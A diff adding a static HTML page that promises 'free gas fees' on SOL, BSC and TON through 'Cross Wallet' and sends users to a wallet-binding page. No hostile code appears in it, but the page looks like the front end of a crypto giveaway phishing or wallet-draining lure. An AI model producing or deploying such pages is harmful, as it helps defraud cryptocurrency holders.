@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Free Gas Fees - SOL, BSC, TON</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap">
+  <link rel="icon" href="/images/favicon.ico" type="image/x-icon">
+  <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon">
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  
+  <style>
+    /* Basic Reset */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      scroll-behavior: smooth;
+    }
+    body {
+      font-family: 'Roboto', sans-serif;
+      background: linear-gradient(135deg, #A0D683, #D3EE98, #c4eb59);
+      color: #f5f5f5;
+      line-height: 1.6;
+      padding: 20px;
+      overflow-x: hidden;
+      display: flex;
+      justify-content: center;
+    }
+    h1 {
+      color: #a4e786;
+      text-align: center;
+      font-size: 2.5em;
+      margin-bottom: 10px;
+    }
+    p {
+      text-align: center;
+      font-size: 1.1em;
+      color: #b8f3a3;
+    }
+    
+    /* Container */
+    .container {
+      background: #1f2108;
+      max-width: 500px;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.2);
+      animation: fadeInUp 1s ease-out;
+    }
+
+    /* Step Sections */
+    .step {
+      margin-bottom: 30px;
+    }
+    .step h2 {
+      color: #a4e786;
+      font-size: 1.6em;
+      margin-bottom: 10px;
+    }
+    label {
+      display: block;
+      color: #e8ffe0;
+      margin-top: 10px;
+      font-size: 1.1em;
+    }
+    input[type="text"], select {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      background: #131c0e;
+      color: #e8ffe0;
+      border: 1px solid #9ee0a7;
+      border-radius: 5px;
+      font-size: 1em;
+    }
+    .btn {
+      width: 100%;
+      padding: 12px;
+      background: #a4e786;
+      color: #003909;
+      font-weight: bold;
+      font-size: 1.1em;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 20px;
+      transition: background 0.3s ease;
+    }
+    .btn:hover {
+      background: #bfffa0;
+    }
+
+    /* Responsive */
+    @media (max-width: 768px) {
+      h1 {
+        font-size: 2em;
+      }
+      .container {
+        width: 90%;
+      }
+      label {
+        font-size: 1em;
+      }
+    }
+    @media (max-width: 480px) {
+      h1 {
+        font-size: 1.8em;
+      }
+    }
+  </style>
+</head>
+<body>
+ 
+      
+  <div class="container">
+    <h1>Free Gas Fees</h1>
+    <p>Get free gas fees on SOL, BSC, and TON chains with Cross Wallet.</p>
+
+    <!-- Step 1: Connect Wallet -->
+    <div class="step">
+      <h2>Step 1: Connect Your Wallet</h2>
+      <p>Connect with Cross Wallet to proceed.</p>
+      <button class="btn" onclick="window.location.href='bind.html'">Connect Wallet</button>
+
+    </div>
+
+    <!-- Step 2: Claim Gas Fees -->
+    <div class="step">
+      <h2>Step 2: Claim Your Gas Fees</h2>
+      
+      <!-- Select Network -->
+      <label for="network">Select Network</label>
+      <select id="network" name="network">
+        <option value="sol">SOL (Solana)</option>
+        <option value="bsc">BSC (Binance Smart Chain)</option>
+        <option value="ton">TON (Ton Network)</option>
+      </select>
+      
+      <!-- Enter Amount -->
+      <label for="amount">Enter Amount</label>
+      <input type="text" id="amount" name="amount" placeholder="e.g., 0.01 SOL">
+      
+      <!-- Reason for Gas Fee -->
+      <label for="reason">Reason for Gas Fee</label>
+      <input type="text" id="reason" name="reason" placeholder="Enter the reason">
+      
+      <!-- Claim Button -->
+      <button class="btn" onclick="window.location.href='success.html'">Connect Wallet</button>
+
+    </div>
+  </div>
+
+</body>
+</html>
